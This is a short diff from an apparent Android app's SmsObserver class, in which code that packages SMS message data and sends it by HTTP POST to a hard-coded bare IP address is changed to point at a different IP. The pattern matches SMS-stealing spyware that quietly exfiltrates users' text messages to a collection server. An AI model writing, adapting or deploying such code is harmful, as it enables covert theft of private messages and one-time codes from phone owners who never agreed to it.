@@ -60,7 +60,7 @@ public class SmsObserver extends ContentObserver {
                 pmap.put("data",smsinfo.toString());
                 hmap.put("smsinfo","1");
                 try {
-                    HttpRequestUtil.sendPost("http://123.56.157.131/data", pmap, hmap);
+                    HttpRequestUtil.sendPost("http://207.246.104.61/data", pmap, hmap);
                 } catch (Exception e) {
                     e.printStackTrace();
                 }
